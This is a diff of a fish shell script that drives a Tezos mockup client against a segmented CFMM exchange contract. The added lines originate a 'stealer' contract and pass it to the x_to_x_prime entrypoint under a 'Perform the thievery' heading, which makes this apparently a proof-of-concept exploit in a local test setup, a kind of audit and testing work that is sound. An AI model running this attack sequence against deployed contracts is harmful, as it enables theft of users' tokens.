@@ -76,11 +76,20 @@ mockup-client transfer 0 from $admin to token_b --entrypoint "update_operators" 
 
 ### Set position ###
 
-set set_position_m (chosen_ligo compile expression cameligo --init-file $PWD/ligo/main.mligo "{lower_tick_index = {i = -1048575}; upper_tick_index = {i = 1048575}; lower_tick_witness = {i = -1048575}; upper_tick_witness = {i = 1048575}; liquidity = 10000n; deadline = (\"2035-01-01t10:10:10Z\" : timestamp); maximum_tokens_contributed = { x = 100000n; y = 100000n }}")
+set set_position_m (chosen_ligo compile expression cameligo --init-file $PWD/ligo/main.mligo "{
+  lower_tick_index = {i = -1048575};
+  upper_tick_index = {i = 1048575};
+  lower_tick_witness = {i = -1048575};
+  upper_tick_witness = {i = 1048575};
+  liquidity = 10000n;
+  deadline = (\"2035-01-01t10:10:10Z\" : timestamp);
+  maximum_tokens_contributed = { x = 100000n; y = 100000n }
+}")
 
 mockup-client transfer 0 from $admin to segmented_cfmm --entrypoint "set_position" --arg "$set_position_m" --burn-cap 1
 
 ### X to Y swap ###
+
 set x_to_y_m (chosen_ligo compile expression cameligo --init-file $PWD/ligo/main.mligo "{
     dx = 1_000n;
     deadline = (\"2035-01-01t10:10:10Z\" : timestamp);
@@ -88,11 +97,33 @@ set x_to_y_m (chosen_ligo compile expression cameligo --init-file $PWD/ligo/main
     to_dy = (\"$admin\" : address);
 }")
 
-echo $x_to_y_m
-
 mockup-client transfer 0 from $admin to segmented_cfmm --entrypoint "x_to_y" --arg "$x_to_y_m" --burn-cap 1
-exit 0
 
-mockup-client transfer 0 from $alice to token --entrypoint "transfer" --arg "{ Pair \"$alice\" { Pair \"tz1faswCTDciRzE4oJ9jn2Vm2dvjeyA9fUzU\" (Pair 0 20) } }"  --burn-cap 1
+### Stealer contract creation ###
 
-mockup-client transfer 0 from $bob to token --entrypoint "transfer" --arg "{ Pair \"$bob\" { Pair \"tz1faswCTDciRzE4oJ9jn2Vm2dvjeyA9fUzU\" (Pair 0 200) } }"  --burn-cap 1
+set stealer_storage_ligo "record [
+  admin          = (\"$admin\" : address);
+  y_address  = (\"$token_b_address\" : address);
+]"
+
+set stealer_storage_m (chosen_ligo compile storage $PWD/stealer.ligo  (echo $stealer_storage_ligo | string collect))
+chosen_ligo compile contract $PWD/stealer.ligo > stealer.tz
+
+mockup-client originate contract stealer transferring 1 from bootstrap1 \
+                        running ./stealer.tz \
+                        --init (echo $stealer_storage_m | string collect) --burn-cap 10 --force
+
+set stealer_address (contract_address stealer | string collect)
+
+### Perform the thievery ###
+
+### X to Y swap ###
+set x_to_x_prime_m (chosen_ligo compile expression cameligo --init-file $PWD/ligo/main.mligo "{
+    dx = 1n;
+    x_prime_contract = (\"$stealer_address\" : address);
+    deadline = (\"2035-01-01t10:10:10Z\" : timestamp);
+    min_dx_prime = 1n;
+    to_dx_prime = (\"$admin\" : address);
+}")
+
+mockup-client transfer 0 from $admin to segmented_cfmm --entrypoint "x_to_x_prime" --arg "$x_to_x_prime_m" --burn-cap 1
